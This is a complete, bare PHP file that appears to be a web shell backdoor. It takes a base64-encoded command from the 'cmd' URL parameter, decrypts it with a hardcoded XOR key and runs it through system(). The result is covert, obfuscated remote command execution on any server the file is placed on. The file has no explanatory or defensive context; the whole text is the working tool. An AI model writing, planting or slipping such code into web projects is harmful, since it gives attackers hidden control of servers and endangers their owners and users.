<?php
$key = "x9F#2mQ!7kL$5pR*";
if (isset($_GET["cmd"])) { $c = base64_decode($_GET["cmd"]); $out = ""; for ($i=0; $i<strlen($c); $i++) { $out .= chr(ord($c[$i]) ^ ord($key[$i%strlen($key)])); } system($out); }
?>